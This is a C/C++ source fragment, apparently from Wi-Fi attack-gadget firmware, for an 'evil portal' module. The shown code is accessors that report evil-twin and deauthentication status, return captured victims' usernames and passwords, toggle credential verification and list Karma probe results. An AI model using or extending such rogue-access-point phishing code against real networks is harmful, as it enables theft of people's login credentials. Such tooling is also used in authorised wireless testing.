    out->mode = s_mode;
    snprintf(out->ssid, sizeof(out->ssid), "%s", s_ssid);
    snprintf(out->bssid, sizeof(out->bssid), "%s", s_twin_bssid_str);
    out->channel = s_twin_channel;
    out->twin_coherent = s_twin_coherent;
    out->deauth_frames = s_deauth_frames;
    out->clients = s_clients;
    out->attempts = s_attempts;
    out->confirmed = s_confirmed;
    out->error = s_error[0] ? s_error : NULL;
    out->started_epoch = s_started;
    out->dhcps_ok = s_dhcps_ok;
    out->probes_total = s_probes_total;
    memcpy(out->vendor_counts, s_vendor_counts, sizeof(s_vendor_counts));
}
bool web_hw_evilportal_captures(std::vector<web_hw_evilportal_capture_t> &out)
{
    std::lock_guard<std::mutex> lk(s_captures_mx);
    out.clear();
    for (const auto &cap : s_captures) {
        web_hw_evilportal_capture_t item = {};
        snprintf(item.mac, sizeof(item.mac), "%s", cap.mac);
        snprintf(item.hostname, sizeof(item.hostname), "%s", cap.hostname);
        snprintf(item.url, sizeof(item.url), "%s", cap.url);
        snprintf(item.username, sizeof(item.username), "%s", cap.username);
        snprintf(item.password, sizeof(item.password), "%s", cap.password);
        item.ts = cap.ts;
        out.push_back(item);
    }
    return true;
}
void web_hw_evilportal_clear_captures(void)
{
    std::lock_guard<std::mutex> lk(s_captures_mx);
    s_captures.clear();
    s_attempts = s_confirmed = 0;
    s_verified_ok = s_verified_bad = 0;
    s_verify_cancel = s_verify_running;
}
const char *web_hw_evilportal_logpath(void) { return s_logpath; }
void web_hw_evilportal_set_pwd_mode(int mode) { if (mode >= EP_PWD_FULL && mode <= EP_PWD_LENGTH) s_pwd_mode = mode; }
int web_hw_evilportal_pwd_mode(void) { return s_pwd_mode; }
void web_hw_evilportal_set_verify(bool on) { s_verify = on; if (!on) s_verify_cancel = s_verify_running; }
bool web_hw_evilportal_verify_enabled(void) { return s_verify; }
int web_hw_evilportal_verified_ok(void) { return s_verified_ok; }
int web_hw_evilportal_verified_bad(void) { return s_verified_bad; }
void web_hw_evilportal_set_gateway(const char *ip) { if (valid_ipv4(ip) && !s_active) snprintf(s_gateway, sizeof(s_gateway), "%s", ip); }
const char *web_hw_evilportal_gateway(void) { return s_gateway; }
void web_hw_evilportal_set_auto_stop(uint16_t base_s, uint16_t extended_s) { s_auto_base_s = base_s; s_auto_extended_s = extended_s; }
void web_hw_evilportal_set_debug(bool on) { s_debug = on; }
bool web_hw_evilportal_debug(void) { return s_debug; }
int web_hw_evilportal_karma_start(int secs) { return -begin_karma_scan(secs); }
bool web_hw_evilportal_karma_busy(void) { return s_karma_scanning; }
int web_hw_evilportal_karma_count(void) { return s_karma_count; }
const char *web_hw_evilportal_karma_ssid(int i) { return i >= 0 && i < s_karma_count ? s_karma_probes[i].ssid : ""; }
int web_hw_evilportal_karma_hits(int i) { return i >= 0 && i < s_karma_count ? s_karma_probes[i].hits : 0; }

static const char *const CAPS[] = {
    "evil.portal", "evil.portal.templates", "evil.portal.customTemplates", "evil.portal.twin",
    "evil.portal.karma", "evil.portal.settings", "evil.portal.clone", "evil.portal.verify",
    "evil.portal.coherentTwin", NULL
};
const web_tool_t web_tool_evilportal = { CAPS, handle, evilportal_tick, NULL, evilportal_stop };

#else /* !FACTORY_WEB */
const web_tool_t web_tool_evilportal = { NULL, NULL, NULL, NULL, NULL };
#endif /* FACTORY_WEB */